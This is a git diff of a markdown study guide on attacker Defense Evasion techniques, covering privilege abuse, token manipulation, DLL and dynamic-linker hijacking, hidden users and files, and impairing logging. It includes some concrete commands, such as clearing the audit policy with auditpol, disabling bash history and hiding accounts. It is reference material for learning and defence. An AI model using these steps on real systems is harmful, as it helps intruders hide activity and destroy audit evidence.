@@ -1,12 +1,21 @@
 # Defense Evasion
 Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.
 
-
+<br>
 <hr>
 
 # Table of Contents 
 - [Abuse Elevation Control Mechanism](#abuse-elevation-control-mechanism)
+  - [Setuid & Setgid](#setuid-and-setgid)
+  - [Bypass User Account Control](#bypass-user-account-control)
+  - [Sudo and Sudo Caching](#sudo-and-sudo-caching)
+  - [Elevated Execution with Prompt](#elevated-execution-with-prompt)
 - [Access Token Manipulation](#access-token-manipulation)
+  - [Token Impersonation / Theft](#token-impersonationtheft)
+  - [Create Process with Token](#create-process-with-token)
+  - [Make & Impersonate Token](#make-and-impersonate-token)
+  - [Parent PID Spoofing](#parent-pid-spoofing)
+  - [SID-History Injection](#sid-history-injection)
 - [BITS Jobs](#bits-jobs)
 - [Build Image on Host](#build-image-on-host)
 - [Debugger Evasion](#debugger-evasion)
@@ -14,42 +23,160 @@ Defense Evasion consists of techniques that adversaries use to avoid detection t
 - [Deploy Container](#deploy-container)
 - [Direct Volume Access](#direct-volume-access)
 - [Domain Policy Modification](#domain-policy-modification)
+  - [Group Policy Modification](#group-policy-modification)
+  - [Domain Trust Modification](#domain-trust-modification)
 - [Execution Guardrails](#execution-guardrails)
+  - [Environmental Keying](#environmental-keying)
 - [Exploitation for Defense Evasion](#exploitation-for-defense-evasion)
 - [File and Directory Permissions Modification](#file-and-directory-permissions-modification)
+  - [Windows File and Directory Permissions Modification](#file-and-directory-permissions-modification)
+  - [Linux and Mac File and Directory Permissions Modification](#linux-and-mac-file-and-directory-permissions-modification)
 - [Hide Artifacts](#hide-artifacts)
+  - [Hidden Files & Directories](#hidden-files-and-directories)
+  - [Hidden Users](#hidden-users)
+  - [Hidden Window](#hidden-window)
+  - [NTFS File Attributes](#ntfs-file-attributes)
+  - [Hidden File System](#hidden-file-system)
+  - [Run Virtual Instance](#run-virtual-instance)
+  - [VBA Stomping](#vba-stomping)
+  - [Email Hiding Rules](#email-hiding-rules)
+  - [Resource Forking](#resource-forking)
+  - [Process Argument Spoofing](#process-argument-spoofing)
 - [Hijack Execution Flow](#hijack-execution-flow)
+  - [DLL Search Order Hijacking](#dll-search-order-hijacking)
+  - [DLL Side-Loading](#dll-side-loading)
+  - [Dylib Hijacking](#dylib-hijacking)
+  - [Executable Installer File Permissions Weakness](#executable-installer-file-permissions-weakness)
+  - [Dynamic Linker Hijacking](#dynamic-linker-hijacking)
+  - [Path Interception by PATH Environment Variable](#path-interception-by-path-environment-variable)
+  - [Path Interception by Search Order Hijacking](#path-interception-by-search-order-hijacking)
+  - [Path Interception by Unquoted Path](#path-interception-by-unquoted-path)
+  - [Services File Permissions Weakness](#services-file-permissions-weakness)
+  - [Services Registry Permissions Weakness](#services-registry-permissions-weakness
+  - [COR_PROFILER](#cor_profiler)
+  - [KernelCallbackTable](#kernelcallbacktable)
 - [Impair Defenses](#impair-defenses)
+  - [Disable or Modify Tools](#disable-or-modify-tools)
+  - [Disable Windows Event Logging](#disable-windows-event-logging)
+  - [Impair Command History Logging](#impair-command-history-logging)
+  - [Disable or Modify System Firewall](#disable-or-modify-system-firewall)
+  - [Indicator Blocking](#indicator-blocking)
+  - [Disable or Modify Cloud Firewall](#disable-or-modify-cloud-firewall)
+  - [Disable Cloud Logs](#disable-cloud-logs)
+  - [Safe Mode Boot](#safe-mode-boot)
+  - [Downgrade Attack](#downgrade-attack)
 - [Indicator Removal on Host](#indicator-removal-on-host)
+  - [Clear Windows Event Logs](#clear-windows-event-logs)
+  - [Clear Linux or Mac System Logs](#clear-linux-or-mac-system-logs)
+  - [Clear Command History](#clear-command-history)
+  - [File Deletion](#file-deletion)
+  - [Network Share Connection Removal](#network-share-connection-removal)
+  - [Timestomp](#timestomp)
 - [Indirect Command Execution](#indirect-command-execution)
 - [Masquerading](#masquerading)
+  - [Invalid Code Signature](#invalid-code-signature)
+  - [Right-to-Left Override](#right-to-left-override)
+  - [Rename System Utilities](#rename-system-utilities)
+  - [Masquerade Task or Service](#masquerade-task-or-service)
+  - [Match Legitimate Name or Location](#match-legitimate-name-or-location)
+  - [Space After Filename](#space-after-filename)
+  - [Double File Extension](#double-file-extension)
 - [Modify Authenication Process](#modify-authentication-process)
+  - [Domain Controller Authentication](#domain-controller-authentication)
+  - [Password Filter DLL](#password-filter-dll)
+  - [Pluggable Authentication Modules](#pluggable-authentication-modules)
+  - [Network Device Authentication](#network-device-authentication)
+  - [Reversible Encryption](#reversible-encryption)
 - [Modify Cloud Compute Infrastructure](#modify-cloud-compute-infrastructure)
+  - [Create Snapshot](#create-snapshot)
+  - [Create Cloud Instance](create-cloud-instance)
+  - [Delete Cloud Instance](#delete-cloud-instance)
+  - [Revert Cloud Instance](#revert-cloud-instance)
 - [Modify Registry](#modify-registry)
 - [Modify System Image](#modify-system-image)
+  - [Patch System Image](#patch-system-image)
+  - [Downgrade System Image](#downgrade-system-image)
 - [Network Boundary Bridging](#network-boundary-bridging)
+  - [Network Address Translation Traversal](#network-address-translation-traversal)
 - [Obfuscated Files or Information](#obfuscated-files-or-information)
+  - [Binary Padding](#binary-padding)
+  - [Software Packing](#software-packing)
+  - [Steganography](#steganography)
+  - [Compile After Delivery](#compile-after-delivery)
+  - [Indicator Removal from Tools](#indicator-removal-from-tools)
+  - [HTML Smuggling](#html-smuggling)
 - [Plist File Modification](#plist-file-modification)
 - [Pre-OS Boot](#pre-os-boot)
+  - [System Firmware](#system-firmware)
+  - [Component Firmware](#component-firmware)
+  - [Bootkit](#bootkit)
+  - [ROMMONkit](#rommonkit)
+  - [TFTP Boot](#tftp-boot)
 - [Process Injection](#process-injection)
+  - [Dynamic-link Library Injection](#dynamic-link-library-injection)
+  - [Portable Executable Injection](#portable-executable-injection)
+  - [Thread Execution Hijacking](#thread-execution-hijacking)
+  - [Asynchronous Procedure Call](#asynchronous-procedure-call)
+  - [Thread Local Storage](#thread-local-storage)
+  - [Ptrace System Calls](#ptrace-system-calls)
+  - [Proc Memory](#proc-memory)
+  - [Extra Window Memory Injection](#extra-window-memory-injection)
+  - [Process Hollowing](#process-hollowing)
+  - [Process Doppelgänging](#process-doppelganging)
+  - [VDSO Hijacking](#vdso-hijacking)
+  - [ListPlanting](#listplanting)
 - [Reflective Code Loading](#reflective-code-loading)
 - [Rogue Domain Controller](#rogue-domain-controller)
 - [Rootkit](#rootkit)
 - [Subvert Trust Controls](#subvert-trust-controls)
+  - [Gatekeeper Bypass](#gatekeeper-bypass)
+  - [Code Signing](#code-signing)
+  - [SIP and Trust Provider Hijacking](#sip-and-trust-provider-hijacking)
+  - [Install Root Certificate](#install-root-certificate)
+  - [Mark-of-the-Web Bypass](#mark-of-the-web-bypass)
+  - [Code Signing Policy Modification](#code-signing-policy-modification)
 - [System Binary Proxy Execution](#system-binary-proxy-execution)
+  - [Compiled HTML File](#compiled-html-file)
+  - [Control Panel](#control-panel)
+  - [CMSTP](#cmstp)
+  - [InstallUtil](#installutil)
+  - [Mshta](#mshta)
+  - [Msiexec](#msiexec)
+  - [Odbcconf](#odbcconf)
+  - [Regsvcs / Regasm](#regsvcsregasm)
+  - [Regsvr32](#regsvr32)
+  - [Rundll32](#rundll32)
+  - [Verclsid](#verclsid)
+  - [Mavinject](#mavinject)
+  - [MMC](#mmc)
 - [System Script Proxy Execution](#system-script-proxy-execution)
+  - [PubPrn](#PubPrn)
 - [Template Injection](#template-injection)
 - [Traffic Signaling](#traffic-signaling)
+  - [Port Knocking](#Port-knocking)
 - [Trusted Developer Utilities Proxy Execution](#trusted-developer-utilities-proxy-execution)
+  - [MSBuild](#msbuild)
 - [Unused/Unsupported Cloud Regions](#unusedunsupported-cloud-regions)
 - [Use Alternate Authentication Material](#use-alternate-authentication-material)
+  - [Application Access Token](#application-access-token)
+  - [Pass the Hash](#pass-the-hash)
+  - [Pass the Ticket](#pass-the-ticket)
+  - [Web Session Cookie](#web-session-cookie)
 - [Valid Accounts](#valid-accounts)
-- [Virtualization/Sandbox Evasion](#virtualizationsandbox-evasion)
+  - [Default Account](#default-account)
+  - [Domain Account](#domain-account)
+  - [Local Account](#local-account)
+  - [Cloud Account](#cloud-account)
+- [Virtualization / Sandbox Evasion](#virtualizationsandbox-evasion)
+  - [System Checks](#system-checks)
+  - [User Activity Based Checks](#user-activity-based-checks)
+  - [Time-Based Evasion](#time-based-evasion)
 - [Weaken Encryption](#weaken-encryption)
-- [XSL Script Processing](#xsl-script-processing
+  - [Reduce Key Space](#reduce-key-space)
+  - [Disable Crypto Hardware](#disable-crypto-hardware)
+- [XSL Script Processing](#xsl-script-processing)
 
 <br>
-
 <hr>
 
 # Abuse Elevation Control Mechanism
@@ -61,7 +188,7 @@ Adversaries may circumvent mechanisms designed to control elevate privileges to 
 ## Setuid and Setgid
 An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user’s context
 
-**Linux / macOS**
+### Linux / macOS
 When the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively. Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges
 
 Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications
@@ -79,7 +206,6 @@ Adversaries may choose to find and target vulnerable binaries with the setuid or
 
 <br>
 
-
 ## Bypass User Account Control
 Windows UAC allows a program to elevate its privileges to perform a task under administrator-level permissions, possibly by prompting the user for confirmation
 
@@ -92,13 +218,10 @@ Additional bypass methods are regularly discovered and some used in the wild, su
 
 <br>
 
-
 ## Sudo and Sudo Caching
-
-
 Adversaries perform sudo caching and/or use the sudoers file to elevate privileges to execute commands as other users or spawn processes with higher privileges
 
-**UNIX**
+### UNIX
 **sudo:** Allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system
 * `timestamp_timeout`: The amount of time in minutes between instances of sudo before it will re-prompt for a password
   * sudo has the ability to cache credentials for a period of time
@@ -114,9 +237,7 @@ Adversaries can abuse poor configurations of these mechanisms to escalate privil
   * If it does, then malware can execute sudo commands without needing to supply the user's password
   * If *tty_tickets* is disabled, adversaries can do this from any tty for that user
 
-
 <br>
-
 
 ## Elevated Execution with Prompt
 Adversaries may leverage the *AuthorizationExecuteWithPrivileges* API to escalate privileges by prompting the user for credentials. The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified.
@@ -128,23 +249,18 @@ Adversaries may abuse *AuthorizationExecuteWithPrivileges* to obtain root privil
 * This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API
 
 <br>
-<hr>
 
 # Access Token Manipulation
 Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.
-
-
 
 An adversary can use built-in Windows API functions to copy access tokens from existing processes (Token Stealing)
 * These token can then be applied to an existing process (Token Impersonation) or used to spawn a new process (Create Process with Token)
 
 Any standard user can use the `runas` command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens
 
-
 <br>
 
-
-## Token Impersonation/Theft
+## Token Impersonation / Theft
 An adversary can create a new access token that duplicates an existing token using *DuplicateToken(Ex)*
 * The token can then be used with *ImpersonateLoggedOnUser* to allow the calling thread to impersonate a logged on user's security context, or with *SetThreadToken* to assign the impersonated token to a thread
 
@@ -153,7 +269,6 @@ An adversary may do this when they have a specific, existing process they want t
 
 <br>
 
-
 ## Create Process with Token
 Processes can be created with the token and resulting security context of another user using features such as *CreateProcessWithTokenW* and *runas*
 
@@ -161,12 +276,10 @@ Creating processes with a different token may require the credentials of the tar
 
 <br>
 
-
 ## Make and Impersonate Token
 If an adversary has a username and password but the user is not logged onto the system, the adversary can then create a logon session for the user using the *LogonUser* function. The function will return a copy of the new session's access token and the adversary can use SetThreadToken to assign the token to a thread
 
 <br>
-
 
 ## Parent PID Spoofing
 New processes are typically spawned directly from their parent, or calling, process unless explicitly specified
@@ -181,7 +294,6 @@ Explicitly assigning the PPID may also enable elevated privileges given appropri
 * An adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as lsass.exe), causing the new process to be elevated via the inherited access token
 
 <br>
-
 
 ## SID-History Injection
 **Windows security identifier (SID):** A unique value that identifies a user or group account
@@ -244,7 +356,6 @@ Sometimes a user's action may be required to open it for deobfuscation or decryp
 <br>
 <hr>
 
-
 # Deploy Container
 Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware
 * In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment
@@ -255,7 +366,6 @@ Containers can be deployed by various means, such as via Docker's create and sta
 <br>
 <hr>
 
-
 # Direct Volume Access
 Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique bypasses Windows file access controls as well as file system monitoring tools
 
@@ -264,7 +374,6 @@ Utilities, such as NinjaCopy, exist to perform these actions in PowerShell
 <br>
 <hr>
 
-
 # Domain Policy Modification
 Domains provide a centralized means of managing how computer resources can act, and interact with each other, on a network. The policy of the domain also includes configuration settings that may apply between domains in a multi-domain/forest environment. Modifications to domain settings may include altering domain Group Policy Objects (GPOs) or changing trust settings for domains, including federation trusts.
 
@@ -272,9 +381,7 @@ With sufficient permissions, adversaries can modify domain policy settings. Sinc
 
 Adversaries may temporarily modify domain policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.
 
-
 <br>
-
 
 ## Group Policy Modification
 Group policy allows for centralized management of user and computer settings in AD
@@ -288,16 +395,13 @@ Publicly available scripts such as `New-GPOImmediateTask` can be leveraged to au
 
 <br>
 
-
 ## Domain Trust Modification
 Adversaries may add new domain trusts or modify the properties of existing domain trusts to evade defenses and/or elevate privileges. Domain trust details, such as whether or not a domain is federated, allow authentication and authorization properties to apply between domains for the purpose of accessing shared resources. These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.
 
 Manipulating the domain trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, this may be used to forge SAML Tokens, without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate.
 
-
 <br>
 <hr>
-
 
 # Execution Guardrails
 Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign. Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses
@@ -316,19 +420,17 @@ Values can be derived from target-specific elements and used to generate a decry
 * By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult
   * These difficulties can slow down the incident response process and help adversaries hide their TTPs
 
-
 <br>
 <hr>
-
 
 # Exploitation for Defense Evasion
 Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the OS software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.
 
 Adversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for Security Software Discovery
 * The security software will likely be targeted directly for exploitation
+
 <br>
 <hr>
-
 
 # File and Directory Permissions Modification
 File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions
@@ -348,6 +450,7 @@ Windows implements file and directory ACLs as Discretionary Access Control Lists
 Adversaries can interact with the DACLs using built-in Windows commands, such as `icacls, cacls, takeown, and attrib`, which can grant adversaries higher permissions on specific files and folders
 * PowerShell provides cmdlets that can be used to retrieve or modify file and directory DACLs
   * Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow
+
 <br>
 
 ## Linux and Mac File and Directory Permissions Modification
@@ -357,26 +460,27 @@ Most Linux and Linux-based platforms provide a standard set of permission groups
 Adversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it
 * They could subsequently lock others out of the file
 * Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Unix Shell Configuration Modification or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow
-<br>
 
+<br>
 <hr>
 
 # Hide Artifacts
 Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection
 
 Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology
+
 <br>
 
 ## Hidden Files and Directories
  To prevent normal users from accidentally changing special files on a system, most OS
 s have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (`dir /a` for Windows and `ls –a` for Linux and macOS)
 
-**Linux and Mac**
+### Linux and Mac
 Users can mark specific files as hidden simply by putting a "`.`" as the first character in the file or folder name. Files and folders that start with a period are by default hidden from being viewed in the Finder application and standard command-line utilities like "ls". Users must specifically change settings to have these files viewable.
 
 Files on macOS can also be marked with the `UF_HIDDEN` flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app
 
-**Windows**
+### Windows
 Users can mark specific files as hidden by using the `attrib.exe` binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys
 
 Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files
@@ -386,7 +490,7 @@ Adversaries can use this to their advantage to hide files and folders anywhere o
 ## Hidden Users
 Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users.
 
-**macOS**
+### macOS
 Attackers can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes
 * To prevent a user from being shown on the login screen and in System Preferences
 *   Set the userID to be under 500 and set the key value `Hide500Users` to TRUE in the `/Library/Preferences/com.apple.loginwindow` plist file
@@ -395,34 +499,37 @@ Every user has a userID associated with it. When the `Hide500Users` key value is
 * Using CLI, adversaries can use the *dscl* utility to create hidden user accounts by setting the `IsHidden` attribute to 1
 * Adversaries can also hide a user’s home folder by changing the `chflags` to hidden
 
-**Windows**
+### Windows
 **Hide user accounts** 
 * Set the `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList` Registry key value to 0 for a specific user to prevent that user from being listed on the logon screen
 
-**Linux**
+### Linux
 **Hide user accounts from the login screen (referred to as the greeter)**
 * The method an adversary may use depends on which Display Manager the distribution is currently using
   * On an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the gsettings command (ex: `sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true`)
   * **Note:** Display Managers are not anchored to specific distributions and may be changed by a user or adversary
+
 <br>
 
 ## Hidden Window
 In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks
 
-**Windows**
+### Windows
 There are a variety of features in scripting languages in Windows, such as PowerShell, Jscript, and Visual Basic to make windows hidden
 * `powershell.exe -WindowStyle Hidden`
 
-**macOS**
+### macOS
 The configurations for how applications run are listed in property list (plist) files
 * One of the tags in these files can be `apple.awt.UIElement`, which allows for Java applications to prevent the application's icon from appearing in the Dock
 * A common use for this is when applications run in the system tray, but don't also want to show up in the Dock
+
 <br>
 
 ## NTFS File Attributes
 Every NTFS formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. Within MFT entries are file attributes, such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files).
 
 Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus
+
 <br>
 
 ## Hidden File System
@@ -435,6 +542,7 @@ Adversaries may use their own abstracted file system, separate from the standard
   * Store a file system in reserved disk space unused by disk structures or standard file system partitions
   * Drop your own portable partition image as a file on top of the standard file system
   * Fragment files across the existing file system structure in non-standard ways
+
 <br>
 
 ## Run Virtual Instance
@@ -442,6 +550,7 @@ By running malicious code inside of a virtual instance, adversaries can hide art
 
 Adversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries)
 * After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system
+
 <br>
 
 ## VBA Stomping
@@ -451,6 +560,7 @@ An adversary may hide malicious VBA code by overwriting the VBA source code loca
 * Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code
 * If the VBA source code is removed, some tools might even think that there are no macros present
 * If there is a version match between the *_VBA_PROJECT* stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis
+
 <br>
 
 ## Email Hiding Rules
@@ -462,6 +572,7 @@ Adversaries may utilize email rules within a compromised user's mailbox to delet
 Any user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails
 * These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender
 * Malicious rules commonly filter out emails based on key words (such as malware, suspicious, phish, and hack) found in message bodies and subject lines
+
 <br>
 
 ## Resource Forking
@@ -469,6 +580,7 @@ Any user or administrator within the organization (or adversary with valid crede
 * **Note:** Resource forks have been deprecated and replaced with the application bundle structure; Non-localized resources are placed at the top level directory of an application bundle, while localized resources are placed in the /Resources folder
 
 Adversaries can use resource forks to hide malicious data that may otherwise be stored directly in files. Adversaries can execute content with an attached resource fork, at a specified offset, that is moved to an executable location then invoked. Resource fork content may also be obfuscated/encrypted until execution.
+
 <br>
 
 ## Process Argument Spoofing
@@ -479,8 +591,8 @@ Process command-line arguments are stored in the process environment block (PEB)
 
 Adversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis
 * This behavior may also be combined with other tricks (such as Parent PID Spoofing) to manipulate or further evade process-based detections
-<br>
 
+<br>
 <hr>
 
 # Hijack Execution Flow
@@ -497,7 +609,7 @@ There are many ways an adversary may hijack the flow of execution, including by 
 Windows systems use a common method to look for required DLLs to load into a program.
 Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.
 
-**Hijacking DLL loads**
+### Hijacking DLL loads
 * Planting trojan DLLs in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program
 
 * Binary planting attacks -- Placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL
@@ -510,10 +622,7 @@ Hijacking DLL loads may be for the purpose of establishing persistence as well a
 * If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level
   * This technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program
 
-
 <br>
-
-
 
 ## DLL Side-Loading
 DLL side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload
@@ -521,6 +630,7 @@ DLL side-loading involves hijacking which DLL a program loads. But rather than j
 Side-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. 
 * Benign executables used to side-load payloads may not be flagged during delivery and/or execution
 * Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process
+
 <br>
 
 ## Dylib Hijacking
@@ -533,6 +643,7 @@ Adversaries may gain execution by inserting malicious dylibs with the name of th
 * Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources
 * Based on the application, this could result in privilege escalation and uninhibited network access
   * This method may also evade detection from security products since the execution is masked under a legitimate process
+
 <br>
 
 ## Executable Installer File Permissions Weakness
@@ -549,6 +660,7 @@ Adversaries may use this technique to replace legitimate binaries with malicious
 * Some installers may require elevated privileges that will result in privilege escalation when executing adversary controlled code
   * This behavior is related to Bypass User Account Control
   * If the executing process is set to run at a specific time or during a certain event then this technique can also be used for persistence
+
 <br>
 
 ## Dynamic Linker Hijacking
@@ -556,18 +668,18 @@ During the execution preparation phase of a program, the dynamic linker loads sp
 * Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name
 * These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library
 
-**Linux and macOS**
+### Linux and macOS
 Hijacking dynamic linker variables grants access to the victim process's memory, system/network resources, and possibly elevated privileges
 * This method may evade detection from security products since the execution is masked under a legitimate process
   * Adversaries can set environment variables via CLI using the *export*, *setenv* function, or *putenv* function
   * Adversaries can also leverage Dynamic Linker Hijacking to export variables in a shell or set variables programmatically using higher level syntax such Python’s *os.environ*
 
-**Linux**
+### Linux
 Set *LD_PRELOAD* to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the OS to load the adversary's malicious code upon execution of the victim program
 * *LD_PRELOAD* can be set via the `environment variable` or `/etc/ld.so.preload` file
   * Libraries specified by *LD_PRELOAD* are loaded and mapped into memory by *dlopen()* and *mmap()* 
 
-**macOS**
+### macOS
 Set the `DYLD_INSERT_LIBRARIES` environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program
 
 <br>
@@ -575,7 +687,8 @@ Set the `DYLD_INSERT_LIBRARIES` environment variable to point to malicious libra
 ## Path Interception by PATH Environment Variable
 The *PATH* environment variable contains a list of directories. Certain methods of executing a program rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given
   
-If any directories are listed in the PATH environment variable before the Windows directory, `%SystemRoot%\system32`, a program may be placed in the preceding directory that is named the same as a Windows program, which will be executed when that command is executed from a script or command-line
+If any directories are listed in the PATH environment variable before the Windows directory, `%SystemRoot%\system32`, a program may be placed in the preceding directory that is named the same as a Windows program, which will be executed when that command is executed from a script or CLI
+
 <br>
 
 ## Path Interception by Search Order Hijacking
@@ -586,6 +699,7 @@ Adversaries may execute their own malicious payloads by hijacking the search ord
 
 * Place a program called "net.exe" within the same directory as example.exe, "net.exe" will be run instead of the Windows system utility net
 * In addition, if an adversary places a program called "net.com" in the same directory as "net.exe", then cmd.exe /C net user will execute "net.com" instead of "net.exe" due to the order of executable extensions defined under PATHEXT
+
 <br>
 
 ## Path Interception by Unquoted Path
@@ -595,14 +709,15 @@ Service paths and shortcut paths may also be vulnerable to path interception if 
 
 Attackers can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable.
 * If the path in a shortcut is `C:\program files\myapp.exe`, create a program at `C:\program.exe` that will be run instead of the intended program
+
 <br>
 
 ## Services File Permissions Weakness
 Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start
 * If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process
 * If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions
-<br>
 
+<br>
 
 ## Services Registry Permissions Weakness
 Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts
@@ -636,6 +751,7 @@ The COR_PROFILER environment variable can be set at various scopes (system, user
 Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked
 
 The COR_PROFILER can also be used to elevate privileges (ex: Bypass User Account Control) if the victim .NET process executes at a higher permission level, as well as to hook and Impair Defenses provided by .NET processes
+
 <br>
 
 ## KernelCallbackTable
@@ -652,9 +768,7 @@ The tampered function is typically invoked using a Windows message. After the pr
 * Use of the *KernelCallbackTable* to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process
 
 <br>
-
 <hr>
-
 
 # Impair Defenses
 Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and AV solutions, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.
@@ -696,13 +810,13 @@ Adversaries may target system-wide logging or just that of a particular applicat
   * To clear the audit policy: `auditpol /clear /y or auditpol /remove /allusers`
 
 By disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind
-<br>
 
+<br>
 
 ## Impair Command History Logging
 Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.
 
-**UNIX**
+### UNIX
 `history` command is tracked in a file pointed to by the environment variable *HISTFILE*. When a user logs off a system, this information is flushed to a file in the user's home directory called `~/.bash_history`
 * The **HISTCONTROL** environment variable keeps track of what should be saved by the history command and eventually into the `~/.bash_history` file when a user logs out
   * HISTCONTROL does not exist by default on macOS, but can be set by the user and will be respected
@@ -713,21 +827,21 @@ Adversaries may clear the history environment variable (unset HISTFILE) or set t
   * In some Linux systems, this is set by default to "ignoreboth" which covers both of the previous examples -- This means that " ls" will not be saved, but "ls" would be saved by history
 * Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands
 
-**Windows**
+### Windows
